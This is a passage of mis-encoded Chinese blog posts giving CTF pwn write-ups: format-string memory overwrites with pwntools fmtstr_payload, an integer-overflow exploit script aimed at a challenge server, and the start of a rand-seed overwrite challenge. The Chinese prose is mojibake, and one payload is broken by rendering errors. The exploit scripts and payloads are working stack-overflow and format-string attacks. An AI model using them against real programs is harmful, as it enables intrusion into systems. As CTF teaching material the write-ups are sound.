æ³¨æ„ï¼Œç”±äºæ˜¯å°å€¼ï¼ˆæˆ‘ä»¬æƒ³è¦açš„å€¼æ˜¯2ï¼‰ï¼Œæˆ‘ä»¬å°±ä¸èƒ½æŠŠaçš„åœ°å€æ”¾åˆ°é¦–ä½äº†ï¼Œå› ä¸ºæ”¾åˆ°é¦–ä½æ˜æ˜¾å°±å å››å­—èŠ‚ï¼Œä¸å¯èƒ½è®©å®ƒå†ç­‰äº2äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾€åç§»ï¼ŒåŒæ ·çš„ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°ä¹Ÿå¾—åç§»<br>
payloadï¼š2 * 'a' + '%K$n' + 2 * 'a'(ä¸ºäº†å å¤Ÿ4å­—èŠ‚) + p32([a_addr])</p>
<h3 id="è¦†ç›–å¤§å€¼">è¦†ç›–å¤§å€¼</h3>
<p>æˆ‘ä»¬è¦†ç›–å˜é‡b<br>
è¿˜æ˜¯ä¸¤æ­¥èµ°ï¼š<br>
ç¬¬ä¸€æ­¥ï¼šç¡®å®šbçš„åœ°å€ï¼Œç›´æ¥ida<br>
ç¬¬äºŒæ­¥ï¼šç¡®å®šæ ¼å¼åŒ–å‚æ•°<br>
æ³¨æ„ï¼Œæˆ‘ä»¬çš„bæ˜¯è¦å˜æˆ0x12345678ï¼Œè¾“å…¥é‚£ä¹ˆå¤šä¸œè¥¿æ˜¾ç„¶ä¸å¤ªå¥½ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„è¦†ç›–ï¼Œå°±æ˜¯bçš„åœ°å€è¦†ç›–0x78ï¼Œç„¶åb+1çš„åœ°å€å¤„è¦†ç›–0x56ï¼Œè¿™ç§æ„æ€ï¼Œæœ‰ç‚¹å„¿åƒå®šä½æ”»å‡»ä¸€æ ·<br>
payloadï¼šp32([b_addr]) + p32([b_addr+1]) + ... + p32([b_addr+4]) +  104 * 'a' + '%6<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \Ì²*Ì² &#039;a&#039; + &#039;%7'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%7</span>hhn' + 222 * 'a' + '%8<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \Ì²*Ì² &#039;a&#039; + &#039;%9'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%9</span>hhn'<br>
ï¼ˆ104 + 16(16æ˜¯å‰é¢çš„å››ä¸ªåœ°å€åŠ èµ·æ¥16å­—èŠ‚) = 0x78ï¼Œ0x78 + 222 = 0x156ï¼Œè‡ªåŠ¨èˆå¼ƒå‰é¢çš„1ï¼Œå³0x56ï¼Œåé¢çš„è®¡ç®—æ–¹æ³•åŒä¸Šï¼Œä¸å†èµ˜è¿°ï¼‰</p>
<h2 id="pwntoolsä¸­çš„å®è—å‡½æ•°">pwntoolsä¸­çš„å®è—å‡½æ•°</h2>
<pre><code> pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') â†’ str[source]

    Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits

    The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.
    Parameters:	
        offset (int) â€“ the first formatterâ€™s offset you control
        writes (dict) â€“ dict with addr, value {addr: value, addr2: value2}
        numbwritten (int) â€“ number of byte already written by the printf function
        write_size (str) â€“ must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
        overflows (int) â€“ how many extra overflows (at size sz) to tolerate to reduce the length of the format string
        strategy (str) â€“ either â€˜fastâ€™ or â€˜smallâ€™ (â€˜smallâ€™ is default, â€˜fastâ€™ can be used if there are many writes)
    
    Returns:	The payload in order to do needed writes
</code></pre>
<p>æ‰€ä»¥ä¹‹å‰çš„è¦†ç›–abcçš„payloadå°±ä¸ç”¨æˆ‘ä»¬å†ç®—æ¥ç®—å»äº†<br>
ç›´æ¥è°ƒç”¨è¿™ä¸ªè¶…çº§æ— æ•Œç‰›æ°çš„å‡½æ•°<br>
è¦†ç›–cï¼špayload = fmtstr_payload(6,{c_addr:0x10},write_size='int')<br>
è¦†ç›–aï¼špayload = fmtstr_payload(6,{a_addr:2},write_size='short')<br>
è¦†ç›–bï¼špayload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')<br>
å…¶å®å¯¹äºç¬¬ä¸‰ä¸ªå‚æ•°write_sizeï¼Œä¸‡èƒ½æ–¹æ³•æ˜¯è®©å®ƒç­‰äº'byte'ï¼Œå› ä¸ºæŒ‰å­—èŠ‚æ¥å†™å…¥æ˜¯æœ€å‡†ç¡®çš„ï¼Œé»˜è®¤å€¼ä¹Ÿæ˜¯byteï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯çœç•¥ç¬¬ä¸‰ä¸ªå‚æ•°<br>
å¦å¤–é™„ä¸Šè¦†ç›–å†…å­˜çš„expï¼ˆæˆ‘ç”¨å°è£…å‡½æ•°çš„å½¢å¼æ¥å†™ï¼‰</p>
<pre><code class="language-python">from pwn import *

filename = './overflow'
sh = process(filename)
def stack():
	c_addr = sh.recvuntil('\n',drop = True)
	c_addr = int(c_addr,16)
	#payload = p32(c_addr) + 12 * 'a' + '%6$n'
	payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')

	sh.sendline(payload)
	print sh.recv()

def small():
	a_addr = 0x0804A024
	

	#payload = 'aa' + '%8$n' + 'aa' + p32(a_addr)
	payload = fmtstr_payload(6,{a_addr:2},write_size='short')	

	sh.sendline(payload)
	print sh.recv()

def big():
	b_addr = 0x0804A028
	#payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
	#payload = payload + 104 * 'a' + '%6$hhn' + 222 * 'a' + '%7$hhn' + 222 * 'a' + '%8$hhn' + 222 * 'a' + '%9$hhn'
	payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')
	sh.sendline(payload)
	print sh.recv()

big()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒºâ€”int_overflow]]></title>
        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/</id>
        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
        </link>
        <updated>2020-06-01T12:43:12.000Z</updated>
        <content type="html"><![CDATA[<p>å¬åå­—å°±æ˜¯æ•´æ•°æº¢å‡º<br>
å…ˆå­¦ä¹ ä¸‹ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º</p>
<h1 id="æ•´æ•°æº¢å‡ºçŸ¥è¯†">æ•´æ•°æº¢å‡ºçŸ¥è¯†</h1>
<p>çœ‹é‚£ç§å®˜æ–¹çš„è¯´æ˜çœ‹çš„å¤´å¤§ï¼Œç›´æ¥è¯´è¯´æˆ‘å¯¹æ•´æ•°æº¢å‡ºçš„ç†è§£emm<br>
æ•´æ•°æº¢å‡ºï¼Œé¡¾åæ€ä¹‰å°±æ˜¯æ•´æ•°æº¢å‡ºæ¥äº†ï¼Œä»€ä¹ˆæ˜¯â€œæº¢å‡ºæ¥â€ï¼Œå°±æ˜¯256 = 0ï¼Œ65536 = 0 ä¹‹ç±»çš„<br>
æˆ‘ä»¬çœ‹ä¸ªä¾‹å­  æˆ‘ä»¬åœ¨cè¯­è¨€ä¸­ï¼Œç”¨charå®šä¹‰ä¸€ä¸ªå˜é‡cï¼Œç”¨æ¥å­˜æ”¾ä¸€ä¸ª1å­—èŠ‚8ä¸ªäºŒè¿›åˆ¶ä½çš„æ•°æ®<br>
ç°åœ¨çš„ä¹¦æœ¬ä¹Ÿå¥½ï¼Œæ•™å¸ˆä¹Ÿå¥½ï¼Œæ€»å–œæ¬¢æŠŠcharè®²æˆå®šä¹‰å­—ç¬¦å‹å˜é‡ï¼Œå…¶å®ä¸æ˜¯çš„ï¼Œcharæ¥å®šä¹‰å˜é‡çš„æ—¶å€™ï¼Œæœ¬è´¨å°±æ˜¯ä¸ºä¸€ä¸ªå˜é‡å¼€è¾Ÿä¸€ä¸ªå­—èŠ‚çš„å†…å­˜ç”¨æ¥å­˜æ”¾æ•°æ®ï¼Œè¿™ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´æ˜¯ç”±æˆ‘ä»¬ä»»æ„æ”¯é…çš„ï¼Œæƒ³å­˜ä»€ä¹ˆç±»å‹çš„æ•°æ®éƒ½å¯ä»¥ï¼Œåªä¸è¿‡å¤§å®¶éƒ½ä¹ æƒ¯å­˜å­—ç¬¦å‹çš„è€Œå·²ï¼Œè·‘é¢˜äº†ï¼ˆ</p>
<pre><code class="language-c">char c = 1;
</code></pre>
<p>é‚£ä¹ˆåœ¨å†…å­˜ä¸­å°±æ˜¯ 0000 0001<br>
å¦‚æœæ˜¯c = -1<br>
é‚£ä¹ˆåœ¨å†…å­˜ä¸­å°±æ˜¯ 1000 0001<br>
1ä»£è¡¨ç¬¦å·ä½<br>
é‚£ä¹ˆæ€è€ƒä¸‹ï¼Œcå¯å­˜å‚¨çš„èŒƒå›´æ˜¯å¤šå°‘å‘¢ï¼Ÿ æ˜¯ -128â€”127<br>
å¦‚æœc = 127ï¼Œå³ 0111 1111 é‚£ä¹ˆc = c+1ï¼Œå†æ‰“å°ä¸€ä¸‹cæ˜¯å¤šå°‘å‘¢ï¼Ÿ<br>
<img src="https://zhangzy999.github.io//post-images/1591016175946.png" alt="" loading="lazy"><br>
ç¥å¥‡çš„äº‹æƒ…å‘ç”Ÿäº†ï¼Œæ‰“å°å‡ºæ¥æ˜¯-128ï¼Œå…¶å®ä¹Ÿä¸ç¥å¥‡ï¼Œå› ä¸º0111 1111 + 0000 0001 = 1000 0000  = -128<br>
<img src="https://zhangzy999.github.io//post-images/1591016444486.png" alt="" loading="lazy"><br>
å¦‚æœæ˜¯æ— ç¬¦å·ç±»å‹çš„è¯ï¼Œè¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯0â€”255<br>
æˆ‘ä»¬çœ‹ä»£ç </p>
<pre><code class="language-c">unsigned char c = 256;
printf(&quot;%d\n&quot;,c);
</code></pre>
<p>è¿™æ ·åˆä¼šå˜æˆä»€ä¹ˆå‘¢ï¼Ÿæ€è€ƒä¸€ä¸‹ 256 = 255 + 1<br>
ä¹Ÿå°±æ˜¯ 1111 1111 + 1 ç»“æœç­‰äº (0001)0000 0000 ç„¶è€Œæˆ‘ä»¬å†…å­˜åªç»™å®ƒå¼€è¾Ÿäº†ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œæ‰€ä»¥ç»“æœä¼šç­‰äºé›¶ï¼Œdevä¸Šè¿è¡Œä¸€ä¸‹çœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1591016989930.png" alt="" loading="lazy"><br>
è¿™å°±æ˜¯æ•´æ•°æº¢å‡ºçš„åŸç†ï¼Œè¿™æ˜¯æœ€ç®€å•çš„unsigned charæƒ…å†µï¼Œå¯¹äºwordï¼Œdwordæƒ…å†µä¹Ÿä¸€æ ·</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<h2 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h2>
<p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ç¨‹åºçœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ<br>
<img src="https://zhangzy999.github.io//post-images/1591018218857.png" alt="" loading="lazy"><br>
ç®€å•çš„ä¸€ä¸ªæ¨¡æ‹Ÿç™»å½•çš„åŠŸèƒ½ï¼Œæ¥ç€æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶<br>
<img src="https://zhangzy999.github.io//post-images/1591018245408.png" alt="" loading="lazy"><br>
æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤è¢«æ‰“å¼€äº†ï¼Œæˆ‘ä»¬ç›´æ¥IDAæ¥çœ‹çœ‹mainå‡½æ•°å­<br>
<img src="https://zhangzy999.github.io//post-images/1591018283129.png" alt="" loading="lazy"><br>
æˆ‘ä»¬è·Ÿè¿›å»loginå‡½æ•°<br>
<img src="https://zhangzy999.github.io//post-images/1591018316958.png" alt="" loading="lazy"><br>
æœ‰ä¸€ä¸ªcheckå¯†ç çš„å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1591018361068.png" alt="" loading="lazy"><br>
å‘ç°strcpyå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯èƒ½ä¼šå­˜åœ¨æº¢å‡ºï¼Œå‘ç°æ˜¯æŠŠsèµ‹ç»™destï¼Œè€Œsçš„ç©ºé—´åˆå¤§äºdestï¼Œæ‰€ä»¥å­˜åœ¨æº¢å‡ºï¼ˆså³æˆ‘ä»¬åœ¨loginå‡½æ•°é‡Œé¢ä¼ å…¥çš„å‚æ•°bufï¼‰ï¼Œä½†æ˜¯å…³é”®æ˜¯ä¸Šé¢æœ‰ä¸€ä¸ªåˆ¤æ–­é•¿åº¦çš„ifåˆ¤æ–­è¯­å¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•æ¥ç»•è¿‡ifåˆ¤æ–­<br>
çœ‹åˆ°v3æ˜¯unsigned charç±»å‹çš„ï¼ˆå³IDAä¸­çš„unsigned __int8ï¼‰ï¼Œè¦æ±‚v3åœ¨4â€”8ä¹‹é—´<br>
æ ¹æ®ä¹‹å‰è®²è§£çš„å°±å¯ä»¥ä½¿ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡ifåˆ¤æ–­<br>
256 = 0ï¼Œé‚£ä¹ˆ260 = 4ï¼Œç›®æ ‡æ˜ç¡®äº†ï¼Œç„¶åæ‰¾åç§»é‡<br>
<img src="https://zhangzy999.github.io//post-images/1591020302218.png" alt="" loading="lazy"><br>
å¥ˆæ–¯ï¼Œç„¶åå‘ç°ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°<br>
<img src="https://zhangzy999.github.io//post-images/1591020348124.png" alt="" loading="lazy"><br>
å¥ˆæ–¯ï¼Œç„¶åæ‰¾åˆ°cat flagçš„åœ°å€<br>
<img src="https://zhangzy999.github.io//post-images/1591020376308.png" alt="" loading="lazy"><br>
ä¸‡äº‹å…·å¤‡ï¼Œåªæ¬ exp</p>
<h2 id="expç¼–å†™">expç¼–å†™</h2>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '37599'
r = remote(ip,port)

system_addr = 0x08048694
offset = 0x14 + 0x4    #åŠ 4æ˜¯è¦†ç›–åŸå‡½æ•°çš„ebpçš„å€¼
p32_system_addr = 0x4    #è¿™ä¸ªæ˜¯p32å‘è¿‡å»systemçš„åœ°å€æ‰€å çš„4ä¸ªå­—èŠ‚ï¼Œåœ¨æ•´æ•°æº¢å‡ºçš„æ—¶å€™è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªç‚¹    
unsigned_int_flow = 260 - offset - p32_system_addr    

payload = 'A' * offset + p32(system_addr) + 'A' * unsigned_int_flow

r.recvuntil('Your choice:')
r.sendline('1')

r.recvuntil('Please input your username:')
r.sendline('Hello')

r.recvuntil('Please input your passwd:')
r.sendline(payload)
r.interactive()
</code></pre>
<p>ç„¶åå°±æ˜¯flagè¾£ï¼Œå¥ˆæ–¯<br>
<img src="https://zhangzy999.github.io//post-images/1591020622027.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ”»é˜²ä¸–ç•Œpwnæ–°æ‰‹åŒºâ€”guess_num]]></title>
        <id>https://zhangzy999.github.io/post/ad5_guess_num/</id>
        <link href="https://zhangzy999.github.io/post/ad5_guess_num/">
        </link>
        <updated>2020-06-01T02:42:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="srandå‡½æ•°å’Œrandå‡½æ•°">srand()å‡½æ•°å’Œrand()å‡½æ•°</h1>
<h2 id="å¼•ç”¨">å¼•ç”¨</h2>
<p>è§£è¿™ä¸ªé¢˜é¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä¸‹srand()å’Œrand()</p>
<blockquote>
<p>è¦è®¡ç®—æœºäº§ç”Ÿä¸€ä¸ªéšæœºæ•°ä¸åƒæ‰”è‰²å­ä¸€æ ·ï¼Œè®¡ç®—æœºçš„æ¯ä¸€æ­¥æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œä¸€å †ä»£ç ï¼Œè¿™äº›ä»£ç æ˜¯äº‹å…ˆå®‰æ’å¥½çš„ï¼Œæ‰€ä»¥è®¡ç®—æœºçš„äº§ç”Ÿè¡Œä¸ºæ˜¯ä¸å…·æœ‰éšæœºæ€§å’Œé¢„æµ‹æ€§çš„ï¼ˆå½“ç„¶è¿™é‡Œè¯´çš„æ˜¯ç°é˜¶æ®µçš„è®¡ç®—æœºä½“ç³»ï¼Œåˆ°æœªæ¥çš„è®¡ç®—æœºçš„ä½“ç³»ï¼ŒæœªçŸ¥ï¼‰ï¼Œæ‰€ä»¥è®¡ç®—æœºäº§ç”Ÿçš„éšæœºæ•°éƒ½ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„éšæœºæ•°ï¼Œåªæ˜¯ä¼ªéšæœºæ•°ï¼Œä»–ä»¥ä¸€ä¸ªçœŸå€¼ï¼ˆä¹Ÿç§°ä¸ºç§å­ï¼‰ä½œä¸ºåˆå§‹æ¡ä»¶ï¼Œç„¶åç”¨ä¸€å®šçš„ç®—æ³•ä¸åœè¿­ä»£äº§ç”Ÿéšæœºæ•°ã€‚åº“å‡½æ•°ä¸­ç³»ç»Ÿæä¾›äº†ä¸¤ä¸ªå‡½æ•°ç”¨äºäº§ç”Ÿéšæœºæ•°ï¼šsrand()å’Œrand()<br>
randå‡½æ•°ï¼šrandçš„å†…éƒ¨æ˜¯ç”¨çº¿æ€§åŒä½™æ³•åšçš„ï¼Œä¸æ˜¯çœŸçš„éšæœºæ•°ï¼Œåªä¸è¿‡å› ä¸ºå…¶å‘¨æœŸç‰¹åˆ«é•¿ï¼Œæ‰€ä»¥åœ¨ä¸€å®šèŒƒå›´å†…å¯ä»¥çœ‹æˆæ˜¯éšæœºçš„ï¼Œrand()ä¼šè¿”å›ä¸€éšæœºå€¼ï¼ŒèŒƒå›´åœ¨0åˆ°RAND_MAXé—´ï¼Œåœ¨è°ƒç”¨æ­¤å‡½æ•°äº§ç”Ÿéšæœºæ•°å‰ï¼Œå¿…é¡»åˆ©ç”¨srand()è®¾å¥½éšæœºæ•°ç§å­ï¼Œè‹¥æ²¡æœ‰è®¾éšæœºæ•°ç§å­ï¼Œrand()åœ¨è°ƒç”¨æ—¶ä¼šè‡ªåŠ¨è®¾éšæœºæ•°ç§å­ä¸º1ã€‚<br>
è¿”å›å€¼ï¼šè¿”å›0åˆ°RAND_MAXä¹‹é—´çš„æ•´æ•°å€¼ï¼ŒRAND_MAXçš„èŒƒå›´æœ€å°‘åœ¨32767ä¹‹é—´ï¼ˆintï¼‰ï¼Œå³åŒå­—èŠ‚ï¼ˆ16ä½ï¼‰ã€‚è‹¥unsigned intåŒå­—èŠ‚æ˜¯65535ï¼Œä¸”0-RAND_MAXæ¯ä¸ªæ•°å­—è¢«é€‰ä¸­çš„éšæœºç‡æ˜¯ç›¸åŒçš„ã€‚  rand()äº§ç”Ÿçš„æ˜¯å‡éšæœºæ•°ï¼Œæ¯æ¬¡æ‰§è¡Œæ—¶æ˜¯ç›¸åŒçš„ï¼Œè‹¥è¦ä¸åŒä»¥ä¸åŒçš„å€¼æ¥åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–çš„å‡½æ•°å°±æ˜¯srand()<br>
srandå‡½æ•°ï¼šand()ç”¨æ¥è®¾ç½®rand()äº§ç”Ÿéšæœºæ•°æ—¶çš„éšæœºæ•°ç§å­ï¼Œå‚æ•°seedå¿…é¡»æ˜¯æ•´æ•°ï¼Œé€šå¸¸å¯ä»¥ç”¨time(0)çš„è¿”å›å€¼ä½œä¸ºseed.å¦‚æœæ¯æ¬¡seedéƒ½è®¾ç½®ç›¸åŒçš„å€¼ï¼Œrand()äº§ç”Ÿçš„éšæœºæ•°å€¼æ¯æ¬¡éƒ½ä¸€æ ·ã€‚<br>
srand(unsigned)time(NULL))ä½¿ç”¨ç³»ç»Ÿå®šæ—¶/è®¡æ•°å™¨çš„å€¼ä½œä¸ºéšæœºç§å­æ¯ä¸ªç§å­å¯¹åº”ä¸€ç»„æ ¹æ®ç®—æ³•é¢„å…ˆç”Ÿæˆçš„éšæœºæ•°ï¼Œæ‰€ä»¥åœ¨ç›¸åŒå¹³å°çš„ç¯å¢ƒä¸‹ï¼Œä¸åŒæ—¶é—´äº§ç”Ÿçš„éšæœºæ•°æ˜¯ä¸åŒçš„ï¼Œç›¸åº”çš„è‹¥å°†srand(unsigned)tima(NULL)æ”¹ä¸ºä»»ä¸€å¸¸é‡ï¼Œåˆ™æ— è®ºä½•æ—¶è¿è¡Œï¼Œè¿è¡Œå¤šå°‘æ¬¡å¾—åˆ°çš„éšæœºæ•°éƒ½æ˜¯ä¸€ç»„ç‰¹å®šçš„åºåˆ—ï¼Œæ‰€ä»¥srandç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¼ªéšæœºæ•°ã€‚ä½†æ˜¯ï¼Œæ‰€è°“çš„â€œä¼ªéšæœºæ•°â€æŒ‡çš„å¹¶ä¸æ˜¯å‡çš„éšæœºæ•°ï¼Œå…¶å®ç»å¯¹çš„å¯¹æŠ€æœ¯åªæ˜¯ä¸€ç§å‡æƒ³çŠ¶æ€çš„éšæœºæ•°ï¼Œè®¡ç®—æœºåªèƒ½ç”Ÿæˆç›¸å¯¹çš„éšæœºæ•°ï¼Œè€Œè¿™äº›éšæœºæ•°æ—¢æ˜¯éšæœºçš„åˆæ˜¯æœ‰è§„å¾‹çš„ï¼Œä¸€éƒ¨åˆ†éµå®ˆä¸€å®šè§„å¾‹ï¼Œä¸€éƒ¨åˆ†åˆ™ä¸éµå®ˆä»»ä½•è§„å¾‹ï¼Œæ€»ç»“æ¥è¯´å°±æ˜¯ï¼šè®¡ç®—æœºäº§ç”Ÿä¼ªéšæœºæ•°è€Œä¸æ˜¯ç»å¯¹çš„éšæœºæ•°<br>
åœ¨æ¯æ¬¡äº§ç”Ÿéšæœºåºåˆ—å‰ï¼Œå…ˆæŒ‡å®šä¸åŒçš„ç§å­ï¼Œè¿™æ ·è®¡ç®—å‡ºæ¥çš„éšæœºåºåˆ—å°±ä¸å®Œå…¨ç›¸åŒäº†ï¼Œè€Œä½¿ç”¨åŒç§å­ç›¸åŒçš„æ•°è°ƒç”¨rand()ä¼šå¯¼è‡´ç›¸åŒçš„éšæœºæ•°åºåˆ—è¢«ç”Ÿæˆ</p>
</blockquote>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>æ€»ç»“ä¸€ä¸‹ä¸Šé¢çš„æ–‡æœ¬ï¼šsrand()å‡½æ•°ä¸ºrand()å‡½æ•°æŒ‡å®šéšæœºæ•°ç§å­ï¼Œå¦‚æœæ²¡æœ‰srand()å‡½æ•°ï¼Œé‚£ä¹ˆrand()å‡½æ•°çš„é»˜è®¤éšæœºæ•°ç§å­å°±æ˜¯1ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆç§°rand()ç”Ÿæˆçš„æ•°æ˜¯ä¼ªéšæœºæ•°å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºï¼Œå¦‚æœæ¯æ¬¡éšæœºæ•°ç§å­ä¸€æ ·ï¼Œé‚£ä¹ˆæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚srand(1) ï¼Œé‚£ä¹ˆæ¯æ¬¡çš„rand()å‡ºæ¥çš„æ•°å­—éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸ºäº†éšæœºæ€§å¾—åˆ°æé«˜ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯ç”¨æ—¶é—´å‡½æ•°æ¥ä½œä¸ºéšæœºæ•°ç§å­ï¼Œå› ä¸ºæ—¶é—´æ—¶åˆ»åœ¨å˜åŒ–ï¼Œæ‰€ä»¥ç§å­ä¹Ÿåœ¨å˜åŒ–ï¼Œé‚£ä¹ˆéšæœºæ€§å°±ä¼šå¤§å¤§æé«˜ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<h2 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h2>
<p>æˆ‘ä»¬æ‹¿åˆ°é™„ä»¶åï¼Œå…ˆè¿è¡Œä¸€ä¸‹çœ‹çœ‹ç¨‹åºæ˜¯ä»€ä¹ˆåŠŸèƒ½<br>
<img src="https://zhangzy999.github.io//post-images/1590981254204.png" alt="" loading="lazy"><br>
å¤§è‡´å°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥åå­—ï¼Œç„¶åè®©æˆ‘ä»¬çŒœéšæœºæ•°<br>
æˆ‘ä»¬çœ‹çœ‹ç¨‹åºå¼€å¯äº†å“ªäº›ä¿æŠ¤<br>
<img src="https://zhangzy999.github.io//post-images/1590981270245.png" alt="" loading="lazy"><br>
çœ‹åˆ°ä¿æŠ¤ä¹‹åç¬é—´ä¸æƒ³åšäº†:-(    é‡‘ä¸é›€ nx åœ°å€éšæœºåŒ– ç¥é©¬çš„éƒ½å¼€äº† ï¼ˆè¯è¯´æˆ‘å¥½åƒåœ¨æ–°æ‰‹åŒºï¼‰<br>
ä¸ç®¡äº†ï¼ŒIDAåˆ†æä¸€ä¸‹  å…ˆçœ‹mainå‡½æ•°çš„ä»£ç   å‘ç°äº†å‡ ä¸ªæœ‰æ„æ€çš„ç‚¹<br>
<img src="https://zhangzy999.github.io//post-images/1590981279421.png" alt="" loading="lazy"><br>
é¦–å…ˆæ˜¯getsè¾“å…¥åå­—  è¾“å…¥çš„å­—ç¬¦ä¸²å­˜åˆ°v9å˜é‡é‡Œé¢  é‚£ä¹ˆæ¼æ´åº”è¯¥å°±åœ¨è¿™é‡Œæ²¡é”™äº†<br>
æ¥ä¸‹æ¥è®¾ç½®äº†ä¸€ä¸ªéšæœºæ•°ç§å­ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªéšæœºæ•°ç§å­çš„éšæœºæ€§è‚¯å®šæ˜¯æ²¡é—®é¢˜çš„<br>
æ¥ä¸‹æ¥æ˜¯ä¸ªforå¾ªç¯ï¼Œè®©æˆ‘ä»¬çŒœ10ä¸ªéšæœºæ•°ï¼Œå¦‚æœå¤±è´¥å°±é€€å‡ºç¨‹åºï¼Œå¦‚æœæˆåŠŸå°±è¿è¡Œforå¾ªç¯å¤–é¢çš„é‚£ä¸ªå‡½æ•°<br>
æˆ‘ä»¬è·Ÿè¿›å»é‚£ä¸ªå‡½æ•°çœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1590981291748.png" alt="" loading="lazy"><br>
å¥ˆæ–¯ï¼Œç›´æ¥cat flagï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯æ¥çŒœæ•°å­—ï¼Œä¸è¿‡æ˜¯éšæœºæ•°ï¼Œæˆ‘ä»¬è‚¯å®šå³ä½¿æ˜¯æ¬§çš‡é™„ä½“ä¹Ÿæ˜¯çŒœä¸åˆ°çš„ï¼Œæ‰€ä»¥è€ƒè™‘getsé‚£é‡Œæº¢å‡ºæ¥è¦†ç›–éšæœºæ•°ç§å­seed[0]ï¼Œè®©ç§å­å˜æˆä¸€ä¸ªå¸¸æ•°ï¼Œé‚£ä¹ˆæ¯æ¬¡çš„éšæœºæ•°éƒ½ä¸€æ ·ï¼Œè‡ªç„¶ä¹Ÿå°±å¯é¢„æµ‹äº†ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹åç§»é‡<br>
<img src="https://zhangzy999.github.io//post-images/1590981299498.png" alt="" loading="lazy"><br>
ç„¶åå°±ç›´æ¥å†™exp</p>
<h2 id="ç¼–å†™exp">ç¼–å†™exp</h2>
<p>è¿™ä¸ªexpæ¯”ä¹‹å‰çš„è¦ç•¥å¾®å¤æ‚ä¸€äº›ï¼Œç»è¿‡æŸ¥èµ„æ–™å‘ç°ctypesè¿™ä¸ªåŒ…å¾ˆå¥ˆæ–¯ï¼Œé‡Œé¢çš„cdll.LoadLibrary()å‡½æ•°å¯ä»¥åœ¨åœ¨è„šæœ¬ä¸­åŠ è½½åŠ¨æ€åº“ï¼ŒåŒæ—¶åˆèƒ½è°ƒç”¨åº“ä¸­çš„å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å¯ä»¥é€šè¿‡è°ƒç”¨å¯¹è±¡çš„srand()æ–¹æ³•æ¥ç¡®å®šç§å­ï¼Œé‚£æˆ‘ä»¬å°±ä¸ç”¨å†ç¼–å†™cè¯­è¨€ç¨‹åºæ¥ç¡®å®šéšæœºæ•°äº†ï¼Œæ¯”è¾ƒæ–¹ä¾¿å“ˆ<br>
é€šè¿‡å‘½ä»¤lddæ¥ç¡®å®šåº“çš„è·¯å¾„</p>
<pre><code>ldd filename
</code></pre>
